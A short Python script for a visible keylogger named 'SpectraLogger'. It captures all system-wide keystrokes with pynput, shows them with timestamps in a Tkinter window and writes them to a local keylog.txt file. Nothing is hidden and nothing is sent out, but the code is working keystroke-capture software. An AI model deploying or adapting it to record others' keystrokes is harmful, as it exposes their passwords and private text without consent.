import tkinter as tk
from pynput.keyboard import Key, Listener
import datetime

class SpectraLogger:
    def __init__(self):
        self.keys = []
        self.window = tk.Tk()
        self.window.title("SpectraLogger")
        self.window.geometry("800x600") 
        self.window.resizable(True, True) 
        self.owner_label = tk.Label(self.window, text="Developed by SKumar", font=(" Courier", 10))
        self.owner_label.pack()
        self.logger_label = tk.Label(self.window, text="SpectraLogger v1.0", font=(" Courier", 18, "bold"))
        self.logger_label.pack()
        self.matrix_label = tk.Label(self.window, text="", font=(" Courier", 12))
        self.matrix_label.pack()
        self.log_text = tk.Text(self.window, width=80, height=30)  
        self.log_text.pack()
        self.log_file = open("keylog.txt", "w")
        self.update_matrix()
        self.start_listening()

    def update_matrix(self):
        matrix_text = ""
        for i in range(10):
            for j in range(10):
                if i == 0 or j == 0 or i == 9 or j == 9:
                    matrix_text += "# "
                else:
                    matrix_text += ". "
            matrix_text += "\n"
        self.matrix_label.config(text=matrix_text)
        self.window.after(100, self.update_matrix)

    def on_press(self, key):
        self.keys.append(key)
        self.log_text.insert(tk.END, f"{key} pressed at {datetime.datetime.now()}\n")
        self.log_file.write(f"{key} pressed at {datetime.datetime.now()}\n")

    def on_release(self, key):
        if key == Key.esc:
            self.window.destroy()
            self.log_file.close()
            return False

    def start_listening(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.window.mainloop()
            listener.join()

if __name__ == "__main__":
    logger = SpectraLogger()